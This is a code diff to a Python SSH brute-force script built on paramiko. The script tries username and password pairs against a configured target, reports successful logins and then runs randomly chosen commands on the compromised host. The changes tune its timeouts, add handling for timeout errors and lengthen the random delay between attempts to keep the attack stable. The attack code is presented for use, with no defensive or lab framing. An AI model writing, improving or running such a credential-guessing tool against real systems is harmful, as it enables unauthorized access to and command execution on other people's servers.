@@ -2,6 +2,8 @@ import paramiko
 import time
 import random
 import sys
+import socket
+from paramiko.ssh_exception import SSHException
 
 # =========================
 # TARGET CONFIGURATION
@@ -31,18 +33,22 @@ def attempt_login(username, password):
             port=PORT,
             username=username,
             password=password,
-            timeout=5
+            timeout=8,              # increased timeout
+            banner_timeout=8,
+            auth_timeout=8
         )
 
         print(f"[SUCCESS] {username}:{password}")
 
-        # Execute random commands
         for cmd in random.sample(commands, 3):
             client.exec_command(cmd)
             print(f"[COMMAND] {cmd}")
             time.sleep(1)
 
         client.close()
+
+    except (SSHException, socket.timeout):
+        print(f"[TIMEOUT] {username}:{password}")
 
     except Exception:
         print(f"[FAILED] {username}:{password}")
@@ -61,7 +67,7 @@ def main():
 
         attempt_login(username, password)
 
-        delay = random.uniform(1, 3)
+        delay = random.uniform(2, 4)   # slightly slower = more stable
         print(f"[WAIT] {round(delay, 2)} seconds\n")
         time.sleep(delay)
 
